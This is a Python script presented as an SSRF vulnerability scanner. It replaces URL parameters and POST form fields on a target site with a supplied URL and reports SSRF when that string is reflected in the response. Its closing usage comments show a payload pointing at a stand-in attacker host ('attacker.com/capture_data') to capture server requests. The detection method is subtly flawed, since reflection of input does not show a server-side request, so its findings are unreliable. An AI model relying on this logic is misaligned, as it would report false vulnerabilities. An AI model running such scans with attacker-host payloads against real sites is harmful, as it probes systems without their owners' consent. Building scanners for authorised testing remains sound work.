import argparse
import logging
import requests
from bs4 import BeautifulSoup
import re
import urllib.parse

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def setup_argparse():
    """Sets up the argument parser for the CLI."""
    parser = argparse.ArgumentParser(description='Detects potential Server-Side Request Forgery (SSRF) vulnerabilities.')
    parser.add_argument('url', help='The URL to scan.')
    parser.add_argument('--timeout', type=int, default=5, help='Timeout for requests in seconds. Default is 5.')
    parser.add_argument('--payload', type=str, default='http://example.com', help='The payload to inject. Default is http://example.com.')
    parser.add_argument('--user-agent', type=str, default='vscan-ssrf-detector/1.0', help='Custom User-Agent header.')
    parser.add_argument('--method', type=str, default='GET', choices=['GET', 'POST'], help='HTTP method to use. Default is GET.')
    return parser.parse_args()

def is_valid_url(url):
    """Validates if the provided URL is properly formatted."""
    try:
        result = urllib.parse.urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def get_forms(url, timeout, user_agent):
    """Extracts all forms from the given URL."""
    try:
        headers = {'User-Agent': user_agent}
        response = requests.get(url, headers=headers, timeout=timeout)
        response.raise_for_status()  # Raise HTTPError for bad responses (4xx or 5xx)
        soup = BeautifulSoup(response.content, 'html.parser')
        return soup.find_all('form')
    except requests.exceptions.RequestException as e:
        logging.error(f"Error fetching URL: {e}")
        return []

def test_ssrf(url, params, payload, timeout, user_agent, method='GET'):
    """Tests for SSRF vulnerability by injecting the payload into URL parameters and form fields."""
    headers = {'User-Agent': user_agent}
    if method == 'GET':
        try:
            modified_params = params.copy()
            for key in modified_params:
                modified_params[key] = payload

            full_url = url
            if modified_params:
                full_url = url + "?" + urllib.parse.urlencode(modified_params)

            logging.info(f"Testing URL: {full_url}")

            response = requests.get(full_url, headers=headers, timeout=timeout, allow_redirects=False)
            response.raise_for_status()

            if re.search(re.escape(payload), response.text):
                logging.warning(f"Potential SSRF vulnerability detected in URL parameters. Payload reflected in response.")
                return True
            else:
                logging.info("No SSRF vulnerability detected in URL parameters.")
                return False
        except requests.exceptions.RequestException as e:
            logging.error(f"Error during GET request: {e}")
            return False

    elif method == 'POST':
        try:
            modified_data = params.copy()
            for key in modified_data:
                modified_data[key] = payload

            logging.info(f"Testing POST request to URL: {url} with data: {modified_data}")

            response = requests.post(url, data=modified_data, headers=headers, timeout=timeout, allow_redirects=False)
            response.raise_for_status()

            if re.search(re.escape(payload), response.text):
                logging.warning(f"Potential SSRF vulnerability detected in POST data. Payload reflected in response.")
                return True
            else:
                logging.info("No SSRF vulnerability detected in POST data.")
                return False
        except requests.exceptions.RequestException as e:
            logging.error(f"Error during POST request: {e}")
            return False
    else:
        logging.error(f"Invalid method: {method}")
        return False

def extract_params(url):
    """Extracts URL parameters."""
    parsed_url = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed_url.query)
    # Convert lists to single values if they exist
    return {k: v[0] if isinstance(v, list) else v for k, v in query_params.items()}

def main():
    """Main function to execute the SSRF detection."""
    args = setup_argparse()

    if not is_valid_url(args.url):
        logging.error("Invalid URL provided. Please provide a valid URL.")
        return

    try:
        logging.info(f"Starting SSRF scan on {args.url}")

        # Extract URL parameters for GET requests
        url_params = extract_params(args.url)

        # Test for SSRF in URL parameters
        test_ssrf(args.url, url_params, args.payload, args.timeout, args.user_agent, method="GET")

        # Extract forms and test each form for SSRF (POST requests)
        forms = get_forms(args.url, args.timeout, args.user_agent)
        for form in forms:
            form_details = {}
            try:
              form_details["action"] = form.attrs.get("action").lower()
            except AttributeError:
              form_details["action"] = args.url
            form_details["method"] = form.attrs.get("method", "get").lower()
            
            inputs = []
            for input_tag in form.find_all("input"):
                input_type = input_tag.attrs.get("type", "text")
                input_name = input_tag.attrs.get("name")
                input_value = input_tag.attrs.get("value", "")
                inputs.append({"type": input_type, "name": input_name, "value": input_value})

            form_data = {}
            for input_detail in inputs:
                if input_detail["name"]:
                    form_data[input_detail["name"]] = input_detail["value"]

            if form_details["method"] == "post":
                test_ssrf(urllib.parse.urljoin(args.url, form_details["action"]), form_data, args.payload, args.timeout, args.user_agent, method="POST")
            
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")
    finally:
        logging.info("SSRF scan completed.")

if __name__ == "__main__":
    main()

# Usage Examples:
# 1. Basic scan of a URL:
#    python vscan-ssrf-detector.py http://example.com/vulnerable_page
#
# 2. Scan with custom timeout and payload:
#    python vscan-ssrf-detector.py http://example.com/vulnerable_page --timeout 10 --payload http://attacker.com
#
# 3. Scan using a custom User-Agent:
#    python vscan-ssrf-detector.py http://example.com/vulnerable_page --user-agent "MyCustomScanner"
#
# Offensive tools:
# You can integrate other offensive tools like Burp Suite or OWASP ZAP as proxies for requests made by this script.
# For example: python vscan-ssrf-detector.py http://example.com/vulnerable_page --payload http://attacker.com/capture_data
# Then attacker.com/capture_data can log requests, using tools like tcpdump/wireshark.